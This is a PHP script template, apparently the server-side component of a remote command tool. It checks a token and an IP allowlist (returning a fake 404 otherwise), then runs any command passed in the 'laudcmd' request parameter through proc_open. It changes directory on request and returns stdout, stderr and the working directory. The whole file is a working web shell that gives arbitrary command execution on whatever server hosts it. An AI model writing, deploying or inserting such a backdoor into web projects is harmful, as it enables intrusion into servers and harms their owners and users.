<?php

$allowedIPs = array(${LAUD.IPS});
$allowedToken = "${LAUD.TOKEN}";

$allowed = 0;
$token = isset($_GET['laudtoken']) ? $_GET['laudtoken'] : (isset($_POST['laudtoken']) ? $_POST['laudtoken'] : '');


$LIP = $_SERVER["REMOTE_ADDR"];
if ($token == $allowedToken){
    foreach ($allowedIPs as $IP) {
        if ( $LIP == $IP )
            $allowed = 1;
    }
}

if ($allowed == 0) {
    header("HTTP/1.0 404 Not Found");
    //die();
    die("IP " . $LIP . ", token detected:  " . $token);
}


/* This error handler will turn all notices, warnings, and errors into fatal
 * errors, unless they have been suppressed with the @-operator. */
/*function error_handler($errno, $errstr, $errfile, $errline, $errcontext) {
    header("HTTP/1.0 500 Server Error");
    
    die($errstr);
}

set_error_handler('error_handler');
*/

set_error_handler(function($errno, $errstr, $errfile, $errline, array $errcontext) {
    // error was suppressed with the @-operator
    if (0 === error_reporting()) {
        return false;
    }

    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
});




$command = isset($_GET['laudcmd']) ? $_GET['laudcmd'] : (isset($_POST['laudcmd']) ? $_POST['laudcmd'] : '');

$cwd = isset($_GET['laudcwd']) ? $_GET['laudcwd'] : (isset($_POST['laudcwd']) ? $_POST['laudcwd'] : '.');

if($cwd <> '.'){ 
    chdir(urldecode($cwd));
}

$stdout = '';
$stderr = '';  
            /* Alias expansion. */
            //$length = strcspn($command, " \t");
            //$token = substr($command, 0, $length);
            //if (isset($ini['aliases'][$token]))
            //    $command = $ini['aliases'][$token] . substr($command, $length);
 
    if ($command <> ''){
            $command = urldecode($command);
            if (substr($command, 0, 3) === 'cd ') {
                $params = substr($command, 3);
                if($command == 'cd ~') {
                    $home = getenv("HOME");
                    if($home == FALSE){
                        $params = $_SERVER['DOCUMENT_ROOT'];    
                    }else {
                        $params = $home;
                    }
                }
                
                try{
                if (chdir($params)) {
                    // getcwd();
                }else{
                    $stderr = 'Cannot read dir '.$params;
                }
                }catch(Exception $e) {
                    $stderr = 'Exception on chdir '.$e->$errstr;    
                }
            }else{
                $io = array();
                $p = proc_open($command,
                           array(1 => array('pipe', 'w'),
                                 2 => array('pipe', 'w')),
                           $io);

                /* Read output sent to stdout. */
                while (!feof($io[1])) {
                    $stdout .= fgets($io[1]);
                }
                /* Read output sent to stderr. */
                while (!feof($io[2])) {
                    $stderr .= fgets($io[2]);
                }
            fclose($io[1]);
            fclose($io[2]);
            proc_close($p);
        }
}
?>

<?PHP echo 'stdout=' . urlencode($stdout) . '&stderr=' . urlencode($stderr) . '&cwd=' . urlencode(getcwd()) ?>